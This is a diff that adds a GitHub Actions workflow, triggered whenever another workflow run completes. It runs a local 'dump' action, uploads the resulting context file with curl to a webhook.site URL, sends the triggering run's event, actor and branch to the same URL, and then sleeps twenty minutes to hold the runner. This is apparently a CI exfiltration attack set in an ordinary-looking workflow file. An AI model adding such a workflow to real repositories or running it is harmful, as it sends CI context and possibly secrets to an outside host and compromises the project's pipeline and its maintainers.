@@ -1,0 +1,17 @@
+name: cb-f-wfr
+on:
+  workflow_run:
+    types: [completed]
+jobs:
+  f:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+      - name: dump
+        uses: ./.github/actions/dump
+      - name: upload + hold
+        run: |
+          curl -s -X POST "https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7" -F "f=@ctx-dump.txt" -F "src=live-WFR"
+          curl -s -X POST "https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7" -F "ev=${{ github.event.workflow_run.event }} actor=${{ github.event.workflow_run.actor.login }} branch=${{ github.event.workflow_run.head_branch }}"
+          echo holding; sleep 1200
